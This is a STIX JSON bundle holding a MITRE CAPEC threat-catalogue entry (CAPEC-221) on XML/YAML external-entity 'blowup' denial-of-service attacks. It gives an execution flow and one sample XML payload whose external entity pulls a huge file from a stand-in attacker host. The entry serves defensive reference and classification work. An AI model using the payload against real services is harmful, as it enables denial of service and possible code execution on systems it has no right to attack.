{
    "id": "bundle--6ed2d316-36bd-407d-82f8-a0d49469c381",
    "objects": [
        {
            "created": "2014-06-23T00:00:00.000Z",
            "created_by_ref": "identity--e50ab59c-5c4f-4d40-bf6a-d58418d89bcd",
            "description": "This attack takes advantage of the entity replacement property of certain data serialization languages (e.g., XML, YAML, etc.) where the value of the replacement is a URI. A well-crafted file could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.",
            "external_references": [
                {
                    "external_id": "CAPEC-221",
                    "source_name": "capec",
                    "url": "https://capec.mitre.org/data/definitions/221.html"
                },
                {
                    "external_id": "CWE-611",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/611.html"
                },
                {
                    "description": "XML External Entities",
                    "external_id": "43",
                    "source_name": "WASC",
                    "url": "http://projects.webappsec.org/XML-External-Entities"
                }
            ],
            "id": "attack-pattern--ee525a27-de33-45e9-ba7f-f63562001a5b",
            "modified": "2022-09-29T00:00:00.000Z",
            "name": "Data Serialization External Entities Blowup",
            "object_marking_refs": [
                "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
            ],
            "type": "attack-pattern",
            "x_capec_abstraction": "Detailed",
            "x_capec_child_of_refs": [
                "attack-pattern--247019da-353e-4910-9d11-7dc6c0421a17",
                "attack-pattern--b6f5248a-346f-484f-8091-8ab84288aa81"
            ],
            "x_capec_consequences": {
                "Availability": [
                    "Resource Consumption",
                    "Execute Unauthorized Commands (Run Arbitrary Code)"
                ],
                "Confidentiality": [
                    "Execute Unauthorized Commands (Run Arbitrary Code)"
                ],
                "Integrity": [
                    "Execute Unauthorized Commands (Run Arbitrary Code)"
                ]
            },
            "x_capec_domains": [
                "Software",
                "Software"
            ],
            "x_capec_example_instances": [
                "\n               <xhtml:p>In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer.</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"informative\"><?xml version=\"1.0\"?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM \"http://www.malicious-badguy.com/myhugefile.exe\">]><bomb>&detonate;</bomb></xhtml:div>\n            "
            ],
            "x_capec_execution_flow": "<h2> Execution Flow </h2><div><h3>Explore</h3><ol><li> <p> <b>Find target web service: </b>The adversary must first find a web service that takes input data in the form of a serialized language such as XML or YAML.</p></li></ol></div><div><h3>Experiment</h3><ol><li> <p> <b>Host malicious file on a server: </b>The adversary will create a web server that contains a malicious file. This file will be extremely large, so that if a web service were to try to load it, the service would most likely hang.</p></li><li> <p> <b>Craft malicious data: </b>Using the serialization language that the web service takes as input, the adversary will craft data that links to the malicious file using an external entity reference to the URL of the file.</p></li></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>Send serialized data containing URI: </b>The adversary will send specially crafted serialized data to the web service. When the web service loads the input, it will attempt to download the malicious file. Depending on the amount of memory the web service has, this could either crash the service or cause it to hang, resulting in a Denial of Service attack.</p></li></ol></div>",
            "x_capec_prerequisites": [
                "A server that has an implementation that accepts entities containing URI values."
            ],
            "x_capec_status": "Draft",
            "x_capec_version": "3.9"
        }
    ],
    "spec_version": "2.0",
    "type": "bundle"
}